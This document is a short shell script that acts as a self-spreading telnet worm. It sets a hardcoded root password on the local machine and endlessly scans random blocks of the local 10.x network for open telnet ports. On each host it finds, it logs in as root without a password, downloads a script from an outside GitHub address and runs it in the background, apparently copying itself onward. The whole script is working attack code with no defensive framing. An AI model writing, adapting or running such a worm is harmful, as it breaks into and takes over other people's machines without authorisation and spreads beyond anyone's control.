#!/bin/sh

# set non-blank password
( sleep 1 ; echo "0MFi9ihnb6NmQ85M" ; sleep 1 ; echo "0MFi9ihnb6NmQ85M" ; sleep 1 ) | passwd

MYSUBNET=`route -n | sed -nE 's/^(10\.[0-9]+)\.[0-9]+\.[0-9]+ .+$/\1/p'`
NMAPTIMING="-T polite"

talk() {
  sleep 1
  echo root
  sleep 1
  echo -n 'J=`mktemp` ;'
  echo -n 'curl https://raw.githubusercontent.com/ironiridis/creepy-alarming-lamp/master/cal.sh > $J ;'
  echo -n 'chmod +x $J ;'
  echo 'nohup /bin/sh $J < /dev/null'
  sleep 30
}

connectTo() {
  echo connecting to $1:23 >&2
  talk | timeout -t 60 nc $1 23
}

sweep() {
  cd `mktemp -d`
  if [ -z "$1" ] ; then
    N=$RANDOM
    let "N %= 255"
    SCAN=$MYSUBNET.$N.0/24
  else
    SCAN="$1"
    N=test
  fi
  echo scanning $SCAN:23 >&2
  nmap -p 23 $NMAPTIMING --open -oG hosts_$N $SCAN >/dev/null 2>&1
  sed -En -i 's/^Host: ([0-9.]+) .+Ports:.+$/\1/p' hosts_$N
  for H in `cat hosts_$N` ; do connectTo $H ; done
  G=`pwd` ; cd ; rm -r $G
}

if [ -z "$1" ] ; then
  echo scanning subnet $MYSUBNET.0.0/16 >&2
  while true ; do sweep ; done
else
  connectTo $1
fi
